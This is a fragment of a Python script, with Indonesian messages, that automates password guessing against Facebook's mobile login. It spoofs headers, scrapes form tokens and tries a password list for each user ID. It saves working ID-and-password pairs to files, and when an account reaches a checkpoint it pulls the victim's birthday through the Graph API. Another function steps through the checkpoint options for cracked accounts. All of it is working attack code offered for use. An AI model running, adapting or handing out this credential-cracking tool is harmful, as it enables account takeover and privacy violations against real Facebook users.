		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mobile.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
			fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def cek_log(uid,pw,ua):
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	option = []
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua_xiaomi}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		data = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		tempek = parser(ses.post(mb+form["action"], data=data).text, "html.parser")
		ngew = [yy.text for yy in tempek.find_all("option")]
		jalan(f"\r{P}[•]{K}-----> {B}{uid}•{pw}")
		for opt in range(len(ngew)):
			jalan(f"{U}[{B}{str(opt+1)}{U}]{B}>>>>>{U}[{B}{ngew[opt]}{U}")
		if "0" in str(len(ngew)):
			jalan(f"\r{P}[•]{I} Hore akunya tab yesss, silahkan di login ")
	elif "login_error" in str(run):
		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{uid}•{pw}")
	else:
		jalan(f"\r{P}[•]{K}>>>>>>----> {B}{uid}•{pw}")



if __name__=="__main__":
    os.system("clear")
    mkdir_data_login()
    menu()
